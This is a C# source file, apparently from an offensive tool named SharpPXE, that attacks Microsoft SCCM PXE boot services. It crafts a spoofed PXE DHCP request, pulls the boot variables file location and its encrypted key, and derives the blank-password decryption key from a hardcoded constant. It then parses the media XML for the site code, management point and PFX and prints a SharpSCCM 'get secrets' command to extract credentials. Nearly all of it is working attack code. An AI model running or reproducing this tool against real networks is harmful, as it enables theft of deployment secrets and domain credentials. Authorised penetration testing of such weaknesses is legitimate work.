using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Xml;

namespace SharpPXE
{
    public class SCCM : IDisposable
    {
        private string target;
        private int port;
        private UdpClient udpClient;
        private bool disposed = false;

        public SCCM(string target, int port)
        {
            this.target = target;
            this.port = port;
            this.udpClient = new UdpClient();
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (!disposed)
            {
                if (disposing)
                {
                    udpClient?.Dispose();
                }
                disposed = true;
            }
        }

        private byte[] CraftPacket(string clientIp, byte[] clientMac)
        {
            MemoryStream ms = new MemoryStream();
            BinaryWriter writer = new BinaryWriter(ms);

            // BOOTP Header
            byte[] bootpHeader = new byte[236];

            // 1 for BOOTREQUEST
            bootpHeader[0] = 0x01;

            // 1 for Ethernet
            bootpHeader[1] = 0x01;

            // 6 for MAC address
            bootpHeader[2] = 0x06;

            // 0 Hops
            bootpHeader[3] = 0x00;

            // Random Transaction ID
            Random rnd = new Random();
            uint xid = (uint)rnd.Next();
            Array.Copy(BitConverter.GetBytes(xid), 0, bootpHeader, 4, 4);

            // Seconds elapsed
            bootpHeader[8] = 0x00;
            bootpHeader[9] = 0x00;

            // Flags
            bootpHeader[10] = 0x00;
            bootpHeader[11] = 0x00;

            // Client IP
            IPAddress ciaddr = IPAddress.Parse(clientIp);
            Array.Copy(ciaddr.GetAddressBytes(), 0, bootpHeader, 12, 4);
            Array.Copy(clientMac, 0, bootpHeader, 28, clientMac.Length);

            writer.Write(bootpHeader);

            // DHCP Magic Cookie
            writer.Write(new byte[] { 99, 130, 83, 99 });

            // DHCP Options
            MemoryStream optionsStream = new MemoryStream();
            BinaryWriter optionsWriter = new BinaryWriter(optionsStream);

            // DHCP Message Type: Request
            optionsWriter.Write((byte)53); // Option code 53
            optionsWriter.Write((byte)1);  // Length
            optionsWriter.Write((byte)3);  // DHCPREQUEST

            // Parameter Request List
            optionsWriter.Write((byte)55); // Option code 55
            optionsWriter.Write((byte)11); // Length
            optionsWriter.Write(new byte[] { 3, 1, 60, 128, 129, 130, 131, 132, 133, 134, 135 });

            // Client Architecture (Option 93)
            optionsWriter.Write((byte)93);
            optionsWriter.Write((byte)2);
            optionsWriter.Write(new byte[] { 0x00, 0x00 }); // x86 architecture

            // Private Option (Option 250)
            optionsWriter.Write((byte)250);
            byte[] option250Data = HexStringToByteArray("0c01010d020800010200070e0101050400000011ff");
            optionsWriter.Write((byte)option250Data.Length);
            optionsWriter.Write(option250Data);

            // Vendor Class Identifier (Option 60)
            optionsWriter.Write((byte)60);
            byte[] vendorClassId = Encoding.ASCII.GetBytes("PXEClient");
            optionsWriter.Write((byte)vendorClassId.Length);
            optionsWriter.Write(vendorClassId);

            // PXE Client Machine Identifier (Option 97)
            optionsWriter.Write((byte)97); // Option code 97
            byte[] clientMachineId = HexStringToByteArray("002a8c4d9dc16c42418387efc6d873c6d2");
            optionsWriter.Write((byte)clientMachineId.Length);
            optionsWriter.Write(clientMachineId);
            optionsWriter.Write((byte)255);
            writer.Write(optionsStream.ToArray());

            return ms.ToArray();
        }

        private static byte[] HexStringToByteArray(string hex)
        {
            hex = hex.Replace(" ", "");
            int NumberChars = hex.Length;
            byte[] bytes = new byte[NumberChars / 2];
            for (int i = 0; i < NumberChars; i += 2)
                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
            return bytes;
        }

        public (string VariablesFile, string BcdFile, byte[] EncryptedKey) SendBootpRequest(string clientIp, byte[] clientMac)
        {
            byte[] packet = CraftPacket(clientIp, clientMac);
            IPEndPoint remoteEndPoint = new IPEndPoint(IPAddress.Parse(target), port);

            // Bind to any available port
            udpClient.Client.Bind(new IPEndPoint(IPAddress.Any, 0));
            
            udpClient.Send(packet, packet.Length, remoteEndPoint);
            udpClient.Client.ReceiveTimeout = 5000;

            try
            {
                IPEndPoint from = new IPEndPoint(IPAddress.Any, 0);
                byte[] data = udpClient.Receive(ref from);
                var dhcpOptions = ParseDhcpOptions(data);
                if (dhcpOptions.TryGetValue(243, out byte[] variablesFileOption))
                {
                    //Console.WriteLine($"Option 243 Data: {BitConverter.ToString(variablesFileOption)}");
                    variablesFileOption = dhcpOptions[243];
                    var result = ExtractBootFiles(variablesFileOption, dhcpOptions);
                    return result;
                }
                else
                {
                    Console.WriteLine("Option 243 not found in DHCP options.");
                    return (null, null, null);
                }


            }
            catch (SocketException ex)
            {
                Console.WriteLine("Socket exception: " + ex.Message);
                return (null, null, null);
            }
        }

        private Dictionary<int, byte[]> ParseDhcpOptions(byte[] data)
        {
            Dictionary<int, byte[]> options = new Dictionary<int, byte[]>();

            // We need to skipp the BOOTP header (236b) + Magic Cookie (4b) 
            int index = 240;

            if (data.Length < 240 + 4)
            {
                Console.WriteLine("Packet too short");
                return options;
            }

            if (!(data[236] == 99 && data[237] == 130 && data[238] == 83 && data[239] == 99))
            {
                Console.WriteLine("Invalid DHCP magic cookie.");
                return options;
            }

            while (index < data.Length)
            {
                byte optionCode = data[index++];

                if (optionCode == 255) // End
                    break;

                if (optionCode == 0) // Pad
                    continue;

                if (index >= data.Length)
                    break;

                byte length = data[index++];

                if (index + length > data.Length)
                    break;

                byte[] optionData = new byte[length];
                Array.Copy(data, index, optionData, 0, length);
                index += length;

                options[optionCode] = optionData;

               // Console.WriteLine($"Option Code: {optionCode}, Length: {length}, Data: {BitConverter.ToString(optionData)}");
            }

            return options;
        }

        private (string VariablesFile, string BcdFile, byte[] EncryptedKey) ExtractBootFiles(byte[] variablesFileOption, Dictionary<int, byte[]> dhcpOptions)
        {
            string variablesFile = null;
            string bcdFile = null;
            byte[] encryptedKey = null;

            if (variablesFileOption != null && variablesFileOption.Length >= 2)
            {
                byte packetType = variablesFileOption[0];
                byte dataLength = variablesFileOption[1];
                //Console.WriteLine($"Packet Type: {packetType}");
                //Console.WriteLine($"Data Length: {dataLength}");

                if (packetType == 1)
                {
                    if (variablesFileOption.Length >= 2 + dataLength)
                    {
                        variablesFile = Encoding.UTF8.GetString(variablesFileOption, 2, dataLength); //File name of variables file - This means a custom password is in use
                    }
                }
                else if (packetType == 2) // This means the encryption is transfered over the wire
                {

                    if (variablesFileOption.Length >= 2 + dataLength)
                    {
                        encryptedKey = new byte[dataLength];
                        Array.Copy(variablesFileOption, 2, encryptedKey, 0, dataLength);

                        int stringLengthIndex = 2 + dataLength + 1;
                        int beginningOfStringIndex = 2 + dataLength + 2;

                        if (variablesFileOption.Length > stringLengthIndex)
                        {
                            byte stringLength = variablesFileOption[stringLengthIndex];

                            if (variablesFileOption.Length >= beginningOfStringIndex + stringLength)
                            {
                                variablesFile = Encoding.UTF8.GetString(variablesFileOption, beginningOfStringIndex, stringLength);
                            }
                        }
                    }
                }

                // BCD file
                if (dhcpOptions.ContainsKey(252))
                {
                    byte[] bcdOption = dhcpOptions[252];
                    bcdFile = Encoding.UTF8.GetString(bcdOption).TrimEnd('\0');
                }
            }
            else
            {
                Console.WriteLine("[!] No variable file location (DHCP option 243) found!!");
            }

            return (variablesFile, bcdFile, encryptedKey);
        }

        public byte[] ReadMediaVariableFile(byte[] fileData)
        {
            if (fileData.Length <= 32)
                return new byte[0];

            int start = 24;
            int length = fileData.Length - 32; 
            byte[] result = new byte[length];
            Array.Copy(fileData, start, result, 0, length);
            return result;
        }

        public byte[] Aes128DecryptRaw(byte[] data, byte[] key)
        {
            if (key == null)
            {
                throw new ArgumentNullException(nameof(key), "[!] Decryption key cannot be null.");
            }

            using (Aes aes = Aes.Create())
            {
                aes.KeySize = 128;
                aes.BlockSize = 128;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.None;
                aes.Key = key;
                aes.IV = new byte[16];

                using (ICryptoTransform decryptor = aes.CreateDecryptor())
                {
                    return decryptor.TransformFinalBlock(data, 0, data.Length);
                }
            }
        }

        public byte[] Aes256DecryptRaw(byte[] data, byte[] key)
        {
            if (key == null)
            {
                throw new ArgumentNullException(nameof(key), "[!] Decryption key cannot be null.");
            }

            using (Aes aes = Aes.Create())
            {
                aes.KeySize = 256;
                aes.BlockSize = 128;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.None;
                aes.Key = key;
                aes.IV = new byte[16];

                using (ICryptoTransform decryptor = aes.CreateDecryptor())
                {
                    return decryptor.TransformFinalBlock(data, 0, data.Length);
                }
            }
        }

        public string GetEncryptionModeFromKey(byte[] encryptedKey)
        {
            if (encryptedKey == null || encryptedKey.Length < 15)
                return null;

            if (encryptedKey[13] == 0x10 && encryptedKey[14] == 0x66)
                return "aes256";
            else if (encryptedKey[13] == 0x0e && encryptedKey[14] == 0x66)
                return "aes128";
            else if (encryptedKey[13] == 0x03 && encryptedKey[14] == 0x66)
                return "3des";
            return null;
        }

        public string GetEncryptionModeFromHeader(byte[] fileData)
        {
            if (fileData == null || fileData.Length < 18)
                return null;

            if (fileData[16] == 0x10 && fileData[17] == 0x66)
                return "aes256";
            else if (fileData[16] == 0x0e && fileData[17] == 0x66)
                return "aes128";
            else if (fileData[16] == 0x03 && fileData[17] == 0x66)
                return "3des";
            return null;
        }

        public byte[] AesDesKeyDerivation(byte[] password)
        {
            using (SHA1 sha1 = SHA1.Create())
            {
                byte[] keySha1 = sha1.ComputeHash(password);

                byte[] b0 = new byte[64];
                byte[] b1 = new byte[64];

                for (int i = 0; i < keySha1.Length; i++)
                {
                    b0[i] = (byte)(keySha1[i] ^ 0x36);
                    b1[i] = (byte)(keySha1[i] ^ 0x5c);
                }

                for (int i = keySha1.Length; i < 64; i++)
                {
                    b0[i] = 0x36;
                    b1[i] = 0x5c;
                }

                byte[] b0Sha1 = sha1.ComputeHash(b0);
                byte[] b1Sha1 = sha1.ComputeHash(b1);

                byte[] result = new byte[b0Sha1.Length + b1Sha1.Length];
                Array.Copy(b0Sha1, 0, result, 0, b0Sha1.Length);
                Array.Copy(b1Sha1, 0, result, b0Sha1.Length, b1Sha1.Length);

                return result;
            }
        }

        public byte[] DeriveBlankDecryptionKey(byte[] encryptedKey)
        {
            int length = encryptedKey[0];
            if (length + 1 > encryptedKey.Length)
            {
                throw new Exception("[!] Invalid encryptedKey!.");
            }

            byte[] encryptedBytes = new byte[length];
            Array.Copy(encryptedKey, 1, encryptedBytes, 0, length);
            if (encryptedBytes.Length <= 32)
                return new byte[0];

            int encryptedDataLength = encryptedBytes.Length - 32;
            byte[] encryptedData = new byte[encryptedDataLength];
            Array.Copy(encryptedBytes, 20, encryptedData, 0, encryptedDataLength);

            byte[] keyData = new byte[] { 0x9F, 0x67, 0x9C, 0x9B, 0x37, 0x3A, 0x1F, 0x48, 0x82, 0x4F, 0x37, 0x87, 0x33, 0xDE, 0x24, 0xE9 };

            byte[] key = AesDesKeyDerivation(keyData);

            string encryptionMode = GetEncryptionModeFromKey(encryptedKey);

            byte[] decryptedData;
            if (encryptionMode == "aes256")
            {
                byte[] encryptedDataBlock = new byte[32];
                Array.Copy(encryptedData, 0, encryptedDataBlock, 0, Math.Min(32, encryptedData.Length));
                byte[] keyBlock = new byte[32];
                Array.Copy(key, 0, keyBlock, 0, 32);
                decryptedData = Aes256DecryptRaw(encryptedDataBlock, keyBlock);
            }
            else
            {
                byte[] encryptedDataBlock = new byte[16];
                Array.Copy(encryptedData, 0, encryptedDataBlock, 0, 16);
                byte[] keyBlock = new byte[16];
                Array.Copy(key, 0, keyBlock, 0, 16);
                decryptedData = Aes128DecryptRaw(encryptedDataBlock, keyBlock);
            }

            byte[] varFileKey = new byte[10];
            Array.Copy(decryptedData, 0, varFileKey, 0, 10);

            const byte LEADING_BIT_MASK = 0x80;
            List<byte> newKey = new List<byte>();

            foreach (byte b in varFileKey)
            {
                newKey.Add(b);

                if ((LEADING_BIT_MASK & b) == LEADING_BIT_MASK)
                {
                    newKey.Add(0xFF);
                }
                else
                {
                    newKey.Add(0x00);
                }
            }
            return newKey.ToArray();
        }

        public byte[] ReadMediaVariableFileHeader(byte[] fileData)
        {
            int headerLength = 40;
            if (fileData.Length < headerLength)
            {
                headerLength = fileData.Length;
            }

            byte[] header = new byte[headerLength];
            Array.Copy(fileData, 0, header, 0, headerLength);
            return header;
        }

        public void ProcessPxeMediaXml(string mediaXml)
        {
            try
            {
                XmlDocument doc = new XmlDocument();
                doc.LoadXml(mediaXml);
                XmlNode smsMediaGuidNode = doc.SelectSingleNode(".//var[@name='_SMSMediaGuid']");
                string smsMediaGuid = smsMediaGuidNode?.InnerText;

                XmlNode smsTSMediaPFXNode = doc.SelectSingleNode(".//var[@name='_SMSTSMediaPFX']");
                string smsTSMediaPFX = smsTSMediaPFXNode?.InnerText;

                XmlNode smsManagementPointNode = doc.SelectSingleNode(".//var[@name='SMSTSMP']");
                string smsManagementPoint = smsManagementPointNode?.InnerText;
                string smsManagementPointDNS = smsManagementPoint?.Replace("http://", "").Replace("https://", "");

                XmlNode smsSiteCodeNode = doc.SelectSingleNode(".//var[@name='_SMSTSSiteCode']");
                string smsSiteCode = smsSiteCodeNode?.InnerText;

                XmlNode smsMachineGuidUnknownX64Node = doc.SelectSingleNode(".//var[@name='_SMSTSx64UnknownMachineGUID']");
                string smsMachineGuidUnknownX64 = smsMachineGuidUnknownX64Node?.InnerText;

                Console.WriteLine($"[*] Management Point: {smsManagementPoint}");
                Console.WriteLine($"[*] Site Code: {smsSiteCode}");
                Console.WriteLine("[*] Use SharpSCCM to get goodies!!!!");
                Console.WriteLine($"[*]   SharpSCCM.exe get secrets -i \"{{{smsMachineGuidUnknownX64}}}\" -m \"{smsMediaGuid}\" -c \"{smsTSMediaPFX}\" -sc {smsSiteCode} -mp {smsManagementPointDNS}");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[!] Error while trying to process media XML: " + ex.Message);
            }
        }
    }

}
